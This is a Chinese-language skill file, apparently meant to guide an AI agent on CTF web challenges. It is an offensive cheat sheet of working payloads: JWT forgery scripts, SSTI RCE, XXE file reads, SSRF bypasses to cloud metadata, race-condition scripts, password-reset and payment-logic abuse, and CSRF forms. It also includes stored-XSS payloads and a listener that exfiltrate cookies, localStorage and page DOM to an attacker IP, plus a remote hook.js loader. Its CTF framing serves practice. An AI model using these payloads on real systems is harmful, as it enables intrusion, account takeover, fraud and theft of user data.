---
name: web-attack
description: Web 进阶攻击技术。覆盖 CORS、JWT、GraphQL、缓存投毒、请求走私、条件竞争、原型链污染、Host 头注入、子域接管、WebSocket、限流绕过、IDOR 自动化、SSTI、XXE、SSRF 绕过等高级 Web 漏洞的检测与利用。
---

# Web 进阶攻击技术

> 当题目出现 JWT / GraphQL / CORS / WebSocket / API 参数 / 缓存 / 竞态等特征时使用。
> 离线环境原则：只用本机已有工具（curl / python3），禁止下载外部工具。

## CORS 配置错误
```bash
# 基础探测：带 Origin 发请求，看响应头
curl -s -D- -H "Origin: https://evil.com" http://$TARGET/api/user | grep -i "access-control"
# 反射检测 / 通配符绕过 / null origin
curl -s -D- -H "Origin: null" http://$TARGET/api/user
# 只要 ACAO 反射了任意 Origin 且不带 ACAC，配合凭证读取敏感数据：
#   fetch('http://TARGET/api/user',{credentials:'include'}).then(r=>r.text()).then(alert)
```

## JWT 攻击
```bash
# 解 header/payload（无需验签）
python3 -c "import base64,sys;h,p,s=sys.argv[1].split('.');print(base64.urlsafe_b64decode(h+'=='),base64.urlsafe_b64decode(p+'=='))" "$TOKEN"
# alg:none 绕过（改 header alg=none + 空签名）
# 算法混淆（RS256→HS256，用公钥当对称密钥签）：公钥一般可拿（/.well-known/jwks.json）
python3 -c "
import jwt
pub=open('pub.pem','rb').read()
print(jwt.encode({'sub':'admin','role':'admin'},pub,algorithm='HS256'))
"
# 拿到 secret 直接伪造
python3 -c "import jwt;print(jwt.encode({'sub':'admin','role':'admin'},'secret',algorithm='HS256'))"
```

## GraphQL
```bash
# introspection 泄露 schema
curl -s http://$TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
# 批量查询 / alias 轰炸绕限流、mutation 越权
curl -s http://$TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{a:user(id:1){username} b:user(id:2){username}}"}'
```

## SSRF 绕过（内网访问）
```bash
# 直接内网 IP
curl -s "http://$TARGET/fetch?url=http://10.0.0.1/"
# 16进制/八进制/缺省分段绕过：127.0.0.1 → 2130706433 / 0177.0.0.1 / 0 / 127.1
# 重定向绕过：url=http://localhost@evil.com 或 http://2130706433:8080
# 云元数据：http://169.254.169.254/latest/meta-data/ 
# 读文件：file:///etc/passwd, gopher://redis 打内网服务
```

## SSTI
```bash
# 探测：${7*7} {{7*7}} <%= 7*7 %> <#assign x=7*7> 
# 打 python flask/Jinja2 RCE：
#   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
#   {{''.__class__.__mro__[1].__subclasses__()}} 找 subprocess.Popen
# 定向：先探测是哪个引擎，再选对应 payload；只读关键文件/执行命令找 flag
```

## XXE
```bash
# 外带读文件（有回显）
curl -s -X POST http://$TARGET/parse -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
# 无回显外带（OOB）— 离线环境无外网，用内部回显或报错实体
<!DOCTYPE r [<!ENTITY % x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % d SYSTEM "http://你的监听地址/?%x;">]>
```

## 请求走私（CL.TE / TE.CL）
```bash
# 原理：前后端对 Content-Length / Transfer-Encoding 解析不一致
# 用 python requests 精确构造 40xx 探测；命中后可打：缓存投毒、绕过前端 WAF/认证
# 简易探测（CL.TE）：
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX'
```

## 条件竞争（Race / TOCTOU）
```bash
# 并发 N 请求打同一端点（如优惠券/钱包/总量校验）
seq 1 100 | xargs -P 50 -I{} curl -s http://$TARGET/apply -d '{}' -o /dev/null
# 或 python 并发：
python3 - <<'EOF'
import threading, requests, uuid
def w():
    try: requests.post("http://TARGET/apply", data={"code":uuid.uuid4()}, timeout=5)
    except: pass
ts=[threading.Thread(target=w) for _ in range(100)]
[t.start() for t in ts];[t.join() for t in ts]
EOF
```

## 原型链污染（Prototype Pollution）
```bash
# 探测：JSON merge/deep-assign 类端点 POST  {"__proto__":{"isAdmin":true}}
# 或 query 参数 ?__proto__[isAdmin]=true（有些框架合并 query）
# gadget 链：污染 Object.prototype 后找使用 .settings/.config 属性的下游
curl -s -X POST http://$TARGET/api/config -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true}}'
```

## Host 头注入
```bash
# 改 Host 看是否影响链接生成/重置密码
curl -s -D- http://$TARGET/reset -H "Host: evil.com"
# 密码重置投毒：重置链接 base 变成攻击者域名
# 路由绕过：Host: internal-admin / 端口变体；SSRF via Host
```

## 子域接管（Subdomain Takeover）
```bash
# 原理：CNAME 指向已释放的云服务（S3/GitHub pages/Heroku），可注册接管
# 离线内网场景少用；重点是检查 DNS CNAME 是否指向不存在的目标
dig CNAME sub.$TARGET +short
```

## WebSocket（CSWSH / 认证绕过）
```bash
# 未校验 Origin 的 ws 端点可跨站读消息/发消息（CSWSH）
wscat -c ws://$TARGET/socket   # 检查握手是否校验 Origin
# 认证在 query/header 而非 cookie → 可跨站携带
```

## 限流绕过（Rate Limit Bypass）
```bash
# XFF 轮换 / 大小写 / 方法切换 / 参数污染
curl -s -H "X-Forwarded-For: 1.2.3.4" ...
curl -s -X GET  ... -X POST相同参数 ...
# 用于爆破登录/验证码/后台口令
```

## IDOR 自动化（越权批量取数）
```bash
# 遍历对象 ID（数字递增 / UUID 变化）找越权
for id in $(seq 1 1000); do curl -s http://$TARGET/api/user/$id || break; done | tee idor_dump.txt
# 先小范围验证越权（跨用户读到数据）再批量
```

## 负载均衡目标下的 Log Poisoning（重要）
```bash
# 多副本环境下日志投毒的命中问题：
# 注入的 PHP 代码写进了副本 A 的 access.log，include 请求却打到副本 B → 永远不执行
# 解法（按优先级）：
# 1. 改用 session.upload_progress RCE（session 文件路径固定且副本无关）：
#    POST multipart 带 upload_progress → PHP 把进度写进 session 文件 → LFI include 它
# 2. 并发轰炸提高同副本命中：同时发 10 个带 payload 的请求 + 10 个 include 请求
# 3. 检测：连续读同一日志文件，内容/时间戳跳变 = 有多副本
```

## 关键规则
- 先**确认漏洞类型**再上利用，别盲打
- 每次利用后立即查 flag：`find / -name "flag*" 2>/dev/null`、`env | grep -i flag`、库里 `LIKE 'flag{%'`
- 打进内网后横向/提权参考 `pentest`/`post-exploit` skill
- 目标实例重建后旧值作废：以当前实例的真实输出为准


## 自研平台/任务调度类应用通用攻击面
> 目标是「自研 Web 平台 / 管理后台 / 任务调度系统」（AI 基础设施、扫描调度、数据发布、编排系统等）时的优先清单。这类系统的共性：登录 + REST API + 任务执行 + 文件/插件管理。

1. **认证**：默认/弱口令（admin/admin、admin/123456、admin/admin123、admin/password）；注册/找回接口逻辑缺陷；JWT 弱密钥（无字典时手试常见 secret：secret、key、jwt_secret、平台名）；token/密钥硬编码在前端 JS 里直接提取。
2. **API 面**：`/swagger`、`/openapi.json`、`/api/docs`、`/v1`、`/graphql`、`/api/v1/users`——先把接口清单拉全再动手，别盲猜路径。
3. **文件类接口**：上传（路径穿越写任意位置、上传可解析后缀）、下载/导出/头像（任意路径参数 = LFI）、模板/预览渲染（SSTI/LFI）。
4. **任务/命令参数注入**（这类系统最高频的洞）：凡"执行任务"的接口，target/host/路径/工具名/参数等字段被拼进 shell 命令（扫描器、ping、导出、备份、健康检查类功能最常见），用 `;`、`$()`、反引号、`|` 逐字段试逃逸；任务结果轮询接口常回显 stdout——回显即注入成功。
5. **插件/仓库/远程资源**：「从 URL 安装/导入/更新」类接口 = SSRF + 常见 RCE（git clone 到可控路径、拉取后执行）；仓库/节点名里试 `../` 路径穿越。
6. **配置面**：`/config` `/settings` `/env` 管理页；`.env` `config.yaml` `application.yml` 路径穿越直读（连接串/密钥常在里面）。

## 原语到手后立即批量化（别逐文件枚举）
> 拿到任意一条命令注入 / 任意文件读 / RCE 原语后，**第一条命令就把信息捞全**。每个"创建任务→轮询结果"的循环动辄几十秒，一次只取一个文件会把时间烧光在等待上（实测：耗尽全部预算才枚举到 /etc/passwd）。

```bash
# 组合拳一次带回：身份 + 主机信息 + flag 直取 + 全盘搜索
id; hostname; uname -a; ls -la / /home /tmp 2>/dev/null
cat /flag* /FLAG* /home/*/flag* /root/flag* /tmp/flag* 2>/dev/null
find / -maxdepth 4 -iname '*flag*' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -50
grep -rIl 'flag{' / --include='*.txt' --include='*.conf' --include='*.yaml' --include='*.json' 2>/dev/null | head -20
```

同理：文件读原语一次读组合（/etc/passwd + 应用启动配置 + 数据库连接配置 + flag 常见路径），不要一个路径一个请求；SQL 注入能 `LIKE 'flag{%'` 定位、能 UNION/报错回显就绝不逐字符盲注。
# API/业务逻辑/XSS-bot 攻击增量

## 1 API 安全增量

### BOLA/BFLA 检测清单
- 高危端点模式：`/api/admin/*`、`/api/v1..v3/admin/*`（版本降级，老接口常无鉴权）、`/internal/*`、`/api/*/export|batch|search`、关系链 `/api/orders/{id}/owner`（order→user→profile 逐级换 ID）。先拉 `/swagger`、`/v2/api-docs`、`/openapi.json` 拿全接口再逐个用低权 token 重放，对比响应 body 而非只看状态码（很多系统统一返 200/403）。
- BFLA 三板斧：换方法（GET 403 就试 POST/PUT/PATCH/DELETE）、版本降级、方法覆盖头：
```bash
curl -s -X POST http://$T/api/users/1 -H "Authorization: Bearer $TOK" -H "X-HTTP-Method-Override: DELETE"
```

### Mass Assignment 字段猜测表
- 注册/改资料/PATCH 接口一次全塞，看哪个生效：
`role is_admin isAdmin admin user_id userId account_id verified is_active balance points credit level price discount is_vip status team_id`
```bash
curl -s -X POST http://$T/api/register -H "Content-Type: application/json" \
  -d '{"u":"u1","p":"p1","role":"admin","is_admin":true,"balance":99999,"verified":true}'
```

### JWT header 注入（alg:none/RS→HS 之外）
- kid 路径穿越到可控/已知文件当 HS256 密钥（`/dev/null`=空密钥、`/proc/self/environ`=环境变量内容、已上传文件）：
```bash
python3 -c "
import jwt
print(jwt.encode({'sub':'admin','role':'admin'}, key=b'', algorithm='HS256',
                 headers={'kid':'../../../../dev/null'}))"
```
- kid 注入 SQL：后端把 kid 拼进 SQL 取密钥时，kid=`x' UNION SELECT 'secret'-- `，再用返回值 secret 做 HS256 密钥签发。
- jku 指向自己监听目录的 JWKS，自签 RS256 全流程：
```bash
python3 - <<'EOF'
import jwt,json,base64
from cryptography.hazmat.primitives.asymmetric import rsa
k=rsa.generate_private_key(public_exponent=65537,key_size=2048)
p=k.public_key().public_numbers()
b=lambda x:base64.urlsafe_b64encode(x.to_bytes((x.bit_length()+7)//8,'big')).decode().rstrip('=')
open('jwks.json','w').write(json.dumps({"keys":[{"kty":"RSA","n":b(p.n),"e":b(p.e)}]}))
print(jwt.encode({'sub':'admin','role':'admin'},k,algorithm='RS256',headers={'jku':'http://IP:8000/jwks.json'}))
EOF
# 同目录起 python3 -m http.server 8000；x5c 同理把自签证书链内嵌进 header
```

### OAuth 授权码/redirect_uri 校验缺陷
- callback 无 state → 授权码 CSRF（别人的 code 绑到受害者会话）；redirect_uri 变体按序试：
```
https://target.com.attacker.com/cb
https://target.com/cb/../redirect?url=http://内网/
https://target.com@attacker.com
https://target.com:443@attacker.com
https://target.com/cb%00@evil.com
```
- 验证：authorize 是否 302 把 code 带到错误域、token 端点是否校验 code 绑定 client_id。

### 网关路径绕过（归一化差异）
```bash
for p in /api/v1/../v2/admin/users /api/v1/..;/admin/users /api/%2e%2e/admin \
         //api/admin/users /api/ADMIN/users /api/admin/users/ /api/admin/users.json \
         /api/admin/users%00 /api/%252e%252e/admin; do
  printf '%s ' "$p"; curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TOK" "http://$T$p"
done
```
- 网关信任内部头直传后端也试：`X-User-Role: admin`、`X-Internal: true`、`X-Forwarded-For: 127.0.0.1`。

## 2 业务逻辑漏洞模式表

### 支付/积分
- 负数量（总价为负反向入账）、0 元、小数精度（0.001 向下取整成 0）：
```bash
curl -s -X POST http://$T/api/order -H "Content-Type: application/json" \
  -d '{"product_id":1,"quantity":-1,"price":0.001,"total":0}'
```
- 修改响应包价格字段：拦截响应改 price/total/pay_amount 再让前端确认；支付金额与订单金额分离时只付 0.01。
- 并发重复提交/重复退款/提现：复用已有 race 并发脚本打 /pay /refund /withdraw。

### 优惠券/兑换码
- 并发领取/兑换同一码（race 脚本）；重放已成功的兑换请求；短码爆破：
```bash
ffuf -w <(seq -w 0 9999) -u http://$T/api/coupon/redeem -X POST \
  -H "Content-Type: application/json" -d '{"code":"FUZZ"}' -mr "success|成功|valid"
# 6 位码改 seq -w 0 999999
```

### 验证码
- 响应回显：对比两次 send-code 响应 JSON 的可变字段（code/debug/data）。
- 复用：一次验证通过后原样重放同一 code；万能码 000000/123456/888888/666666。
- 换号攻击：给自己发码拿 code，提交时把 phone 改成目标号：
```bash
curl -s -X POST http://$T/api/reset -H "Content-Type: application/json" \
  -d '{"phone":"13900000001","code":"<自己收到的>","new_password":"Passw0rd!"}'
```
- 弱校验：删 code 字段/置空/传数组 `{"code":["123456"]}`/传 `"123456 "`（尾空格）各试一次。

### 状态机
- 跳步（跳过支付/验证直达终态）与非法转移（已完成→退款、已取消→发货）：
```bash
curl -s -X POST http://$T/api/order/status -H "Authorization: Bearer $TOK" \
  -H "Content-Type: application/json" -d '{"order_id":"<自己订单>","status":"completed"}'
```
- 重放确认请求：/paySuccess、/notify、/confirm 类「前端通知后端」端点无签名校验，换 orderNo 即把任意订单置为已支付：
```bash
curl -s "http://$T/paySuccess?payType=2&orderNo=<订单号>" -H "Cookie: <任意登录session>"
```
- 回退套利：已完成改回待支付后用新价格重付；状态值枚举 0-9 加 paid/completed/shipped/cancelled/refunded。

### 密码找回
- token 可预测：时间戳、短数字、md5(用户名/uid)。收集两个 token diff 出规律再批量生成。
- token 未绑定用户：自己的合法 token + 改 uid/username/phone 重置他人：
```bash
curl -s -X POST http://$T/api/password/reset -H "Content-Type: application/json" \
  -d '{"token":"<自己的token>","user_id":2,"new_password":"Passw0rd!"}'
```
- 跳步：step1 发码后直接 POST step3 设新密码；Host 注入重置链接见已有技能（看响应/邮件里链接域名）。

### 越权升级（普通用户打管理端）
```bash
ffuf -w /usr/share/wordlists/common.txt -u http://$T/api/admin/FUZZ \
  -H "Authorization: Bearer $TOK" -fc 404
```
- 403 绕过：尾斜杠/大小写/双斜杠/`/;x=1`/`.json`、`X-Original-URL`/`X-Rewrite-URL` 头、换方法。

## 3 存储型 XSS → 管理员 bot 拿 flag

### 监听点（先起，IP 用 bot 可达的本机/内网地址）
```bash
nohup python3 - <<'EOF' >/dev/null 2>&1 &
from http.server import *
def h(s):
    n=int(s.headers.get('Content-Length',0))
    open('/tmp/hit.log','a').write(s.path+' '+s.rfile.read(n).decode('utf8','replace')+'\n')
    s.send_response(200); s.end_headers()
class H(BaseHTTPRequestHandler): do_GET=do_POST=h
HTTPServer(('0.0.0.0',8000),H).serve_forever()
EOF
```
- 只需 GET 时 `python3 -m http.server 8000`（路径含外带数据）；原始收包用 `socat TCP-LISTEN:9000,reuseaddr,fork OPEN:/tmp/hit.log,creat,append`。

### 一次性外带 payload（flag 常在 bot 的 cookie/localStorage/管理页 DOM）
```html
<img src=x onerror="fetch('http://IP:8000/x?c='+encodeURIComponent(document.cookie)+'&l='+encodeURIComponent(JSON.stringify(localStorage))+'&b='+encodeURIComponent(document.body.innerHTML))">
```
- 兜底/分段：`new Image().src='http://IP:8000/?c='+encodeURIComponent(document.cookie)`；大文本 POST 用 `navigator.sendBeacon('http://IP:8000/',document.body.innerHTML)`。

### 手写 beef 式轻量 hook（不用框架）
- 注入点只负责拉一段 JS，后续命令全靠换 JS 内容：
```html
<script src="http://IP:8000/hook.js"></script>
<img src=x onerror="s=document.createElement('script');s.src='http://IP:8000/hook.js';document.head.appendChild(s)">
```
- hook.js 按轮换内容：读 cookie → GET /cmd 取指令 → fetch 回传结果，改文件即可迭代。

### 注入上下文速查
- 属性内（value='...'，双引号同理换 "）：`' onfocus=alert(1) autofocus x='`
- textarea/style/script 等原始文本域：先闭合标签 `</textarea><img src=x onerror=...>`
- JSON 回显进 HTML：`</script><img src=x onerror="new Image().src='http://IP:8000/?c='+document.cookie">`
- 无引号属性值：前面留空格 `onmouseover=...`
- 直接进 href/src：`javascript:fetch('http://IP:8000/?c='+document.cookie)`
- bot 多为无头浏览器，alert 可能被吞，一律用外带确认命中。

## 4 CSRF 增量（与已有 CORS/race 不重复）

### JSON CSRF（form 发不出 application/json，用 text/plain 拼）
```html
<form action="http://T/api/change-email" method="POST" enctype="text/plain">
<input name='{"email":"a@b.c","x":"' value='"}'></form>
<script>document.forms[0].submit()</script>
```

### GET 型 CSRF（接口接受 GET 改状态时）
```html
<img src="http://T/api/vip/upgrade">
<meta http-equiv="refresh" content="0;url=http://T/api/transfer?to=me&amount=100">
```

### 其它
- 方法覆盖：form POST + 隐藏参数 `_method=PUT`（或 `X-HTTP-Method-Override` 头），绕「仅 POST 校验 token」。
- token 弱校验快速判定：删 token/空值/等长任意值/token 挪到 GET 参数各发一次，仍 200 即中。
- 多步表单：仅第一步校验 token 时直接构造最后一步的请求。
